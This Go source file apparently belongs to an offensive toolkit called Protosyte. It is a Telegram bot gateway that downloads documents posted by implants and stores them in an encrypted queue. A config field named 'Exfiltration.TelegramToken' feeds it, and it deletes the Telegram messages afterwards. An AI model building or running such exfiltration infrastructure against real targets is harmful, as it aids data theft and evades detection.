package main

import (
	"flag"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"syscall"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"protosyte.io/mission-config"
)

func main() {
	missionPath := flag.String("mission", "", "Path to mission.yaml (default: ./mission.yaml or ../mission.yaml)")
	queuePath := flag.String("queue", "", "Path to encrypted message queue database (default: ./broadcast_queue.db)")
	passphrase := flag.String("passphrase", "", "Passphrase for encryption (default: from PROTOSYTE_PASSPHRASE env)")
	flag.Parse()

	// Load mission configuration
	missionConfig, err := mission.LoadMissionConfig(*missionPath)
	if err != nil {
		log.Printf("[BROADCAST] Warning: Failed to load mission.yaml: %v (using environment variables)", err)
		missionConfig = nil
	} else if missionConfig != nil {
		log.Printf("[BROADCAST] Loaded mission: %s (ID: %s)", missionConfig.Mission.Name, missionConfig.Mission.ID)
	}

	// Get bot token from mission config or environment
	var botToken string
	if missionConfig != nil && missionConfig.Exfiltration.TelegramToken != "" {
		botToken = missionConfig.Exfiltration.TelegramToken
		log.Printf("[BROADCAST] Using bot token from mission.yaml")
	} else {
		botToken = os.Getenv("PROTOSYTE_BOT_TOKEN")
	}

	if botToken == "" {
		log.Fatal("PROTOSYTE_BOT_TOKEN not set in mission.yaml or PROTOSYTE_BOT_TOKEN environment variable")
	}

	// Get passphrase for queue encryption
	var queuePassphrase string
	if *passphrase != "" {
		queuePassphrase = *passphrase
	} else {
		queuePassphrase = os.Getenv("PROTOSYTE_PASSPHRASE")
		if queuePassphrase == "" {
			log.Fatal("PROTOSYTE_PASSPHRASE not set (required for encrypted queue)")
		}
	}

	// Determine queue database path
	dbPath := *queuePath
	if dbPath == "" {
		dbPath = "./broadcast_queue.db"
	}
	dbPath, _ = filepath.Abs(dbPath)

	// Initialize encrypted message queue
	queue, err := NewMessageQueue(dbPath, queuePassphrase)
	if err != nil {
		log.Fatalf("[BROADCAST] Failed to create message queue: %v", err)
	}
	defer queue.Close()
	log.Printf("[BROADCAST] Message queue initialized: %s", dbPath)

	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		log.Fatal(err)
	}

	bot.Debug = false

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := bot.GetUpdatesChan(u)

	// Watchdog goroutine to monitor for unauthorized access
	go monitorAccess(bot)

	// Cleanup goroutine for old processed messages
	go func() {
		ticker := time.NewTicker(1 * time.Hour)
		defer ticker.Stop()
		for range ticker.C {
			if err := queue.CleanupOldProcessed(24 * time.Hour); err != nil {
				log.Printf("[QUEUE] Cleanup error: %v", err)
			}
		}
	}()

	// Handle graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		log.Println("[BROADCAST] Shutting down...")
		queue.Close()
		os.Exit(0)
	}()

	log.Println("[BROADCAST] Gateway active - fetching and queueing messages...")
	for update := range updates {
		if update.Message != nil {
			// Log only MessageID and timestamp, never content
			log.Printf("[INF] MsgID %d received at %v", update.Message.MessageID, time.Now())

			// Download and enqueue message document if present
			if update.Message.Document != nil {
				go func(msg *tgbotapi.Message) {
					file, err := bot.GetFile(tgbotapi.FileConfig{
						FileID: update.Message.Document.FileID,
					})
					if err != nil {
						log.Printf("[BROADCAST] Failed to get file: %v", err)
						return
					}

					// Download file data
					fileURL, err := bot.GetFileDirectURL(file.FilePath)
					if err != nil {
						log.Printf("[BROADCAST] Failed to get file URL: %v", err)
						return
					}

					resp, err := http.Get(fileURL)
					if err != nil {
						log.Printf("[BROADCAST] Failed to download file: %v", err)
						return
					}
					defer resp.Body.Close()

					fileData, err := io.ReadAll(resp.Body)
					if err != nil {
						log.Printf("[BROADCAST] Failed to read file data: %v", err)
						return
					}

					// Enqueue encrypted message
					if err := queue.Enqueue(msg, fileData); err != nil {
						log.Printf("[BROADCAST] Failed to enqueue message: %v", err)
						return
					}

					// Delete from Telegram after successful queue (30 second delay for Analysis Rig to fetch if needed)
					time.Sleep(30 * time.Second)
					bot.Send(tgbotapi.NewDeleteMessage(msg.Chat.ID, msg.MessageID))
					log.Printf("[BROADCAST] Deleted message %d from Telegram (now in encrypted queue)", msg.MessageID)
				}(update.Message)
			} else {
				// Non-document message - delete immediately after logging
				time.Sleep(5 * time.Second)
				go func(chatID int64, msgID int) {
					bot.Send(tgbotapi.NewDeleteMessage(chatID, msgID))
				}(update.Message.Chat.ID, update.Message.MessageID)
			}
		}
	}
}


func monitorAccess(bot *tgbotapi.BotAPI) {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		config := tgbotapi.ChatAdministratorsConfig{
			ChatConfig: tgbotapi.ChatConfig{
				ChatID: bot.Self.ID,
			},
		}
		
		admins, err := bot.GetChatAdministrators(config)
		if err != nil {
			log.Printf("[WARN] Failed to check administrators: %v", err)
			continue
		}

		// Log administrator list for security monitoring
		log.Printf("[SEC] Current administrators: %d", len(admins))
	}
}

